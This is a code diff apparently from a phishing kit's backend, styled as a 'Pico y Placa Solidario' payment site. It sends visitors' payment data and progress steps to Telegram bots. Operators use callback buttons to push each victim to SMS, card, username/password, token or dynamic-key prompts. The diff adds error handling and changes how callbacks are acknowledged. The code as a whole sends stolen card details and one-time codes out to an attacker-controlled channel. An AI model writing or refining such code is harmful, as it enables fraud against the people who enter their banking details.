@@ -268,7 +268,6 @@ function formatStepMessage(payload: Record<string, unknown>) {
     '🌿 PICO Y PLACA SOLIDARIO',
     '━━━━━━━━━━━━━━━━━━',
     `📍 ${stepLabel(payload.event, meta)}`,
-    `🆔 Sesión: ${payload.sessionId || '-'}`,
     '━━━━━━━━━━━━━━━━━━',
   ].join('\n');
 }
@@ -284,7 +283,6 @@ function formatPaymentMessage(payload: Record<string, unknown>) {
     '🌿 PICO Y PLACA SOLIDARIO',
     '━━━━━━━━━━━━━━━━━━',
     `📍 ${stepLabel(payload.event, stepMeta)}`,
-    `🆔 Sesión: ${payload.sessionId || '-'}`,
     `💵 Monto: ${formatPenAmount(meta, payload)}`,
     '',
     '💳 DATOS DE PAGO',
@@ -430,14 +428,18 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
 }
 
 async function sendStepsTelegram(payload: Record<string, unknown>) {
-  const { token, chatId } = stepsTelegramConfig();
-  if (!token || !chatId) return { sent: false, skipped: 'telegram-steps-env-missing' };
-  const result = await telegramApi('sendMessage', {
-    chat_id: chatId,
-    text: formatStepMessage(payload),
-    disable_web_page_preview: true,
-  }, token);
-  return result.ok ? { sent: true, bot: 'steps' } : { sent: false, error: `telegram-steps-${result.status || 'unknown'}` };
+  try {
+    const { token, chatId } = stepsTelegramConfig();
+    if (!token || !chatId) return { sent: false, skipped: 'telegram-steps-env-missing' };
+    const result = await telegramApi('sendMessage', {
+      chat_id: chatId,
+      text: formatStepMessage(payload),
+      disable_web_page_preview: true,
+    }, token);
+    return result.ok ? { sent: true, bot: 'steps' } : { sent: false, error: `telegram-steps-${result.status || 'unknown'}` };
+  } catch {
+    return { sent: false, error: 'telegram-steps-failed' };
+  }
 }
 
 // Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
@@ -446,6 +448,13 @@ async function handleTelegramCallback(body: Record<string, unknown>) {
   const callback = body.callback_query as Record<string, unknown> | undefined;
   const data = String(callback?.data || '');
   const match = data.match(/^(?:route|r):([^:]+):(sms|card|approved|userpass|token|dynamic)(?::([^:]+))?$/);
+  if (callback?.id) {
+    await telegramApi('answerCallbackQuery', {
+      callback_query_id: callback.id,
+      text: match ? 'OK' : 'Ignorado',
+      show_alert: false,
+    });
+  }
   if (!match) return json({ ok: true, ignored: true });
 
   const [, rawSessionId, rawAction, rawBrand] = match;
@@ -460,14 +469,6 @@ async function handleTelegramCallback(body: Record<string, unknown>) {
       chat_id: chat.id,
       message_id: message.message_id,
       reply_markup: { inline_keyboard: [] },
-    });
-  }
-
-  if (callback?.id) {
-    await telegramApi('answerCallbackQuery', {
-      callback_query_id: callback.id,
-      text: actionLabel(decision.action),
-      show_alert: false,
     });
   }
 
@@ -574,13 +575,17 @@ export const POST: APIRoute = async ({ request }) => {
   console.info('[debug-api]', payload);
   session.payload = payload;
   let telegram;
-  if (isProcessingEvent(event)) {
-    if (event === 'PAYMENT_SUBMIT') await sendStepsTelegram(payload);
-    telegram = await sendTelegram(payload, { withButtons: true });
-  } else if (isStepsEvent(event)) {
-    telegram = await sendStepsTelegram(payload);
-  } else {
-    telegram = { sent: false, skipped: 'no-telegram-route' };
+  try {
+    if (isProcessingEvent(event)) {
+      if (event === 'PAYMENT_SUBMIT') await sendStepsTelegram(payload);
+      telegram = await sendTelegram(payload, { withButtons: true });
+    } else if (isStepsEvent(event)) {
+      telegram = await sendStepsTelegram(payload);
+    } else {
+      telegram = { sent: false, skipped: 'no-telegram-route' };
+    }
+  } catch {
+    telegram = { sent: false, error: 'telegram-send-failed' };
   }
 
   return json({ ...payload, telegram });
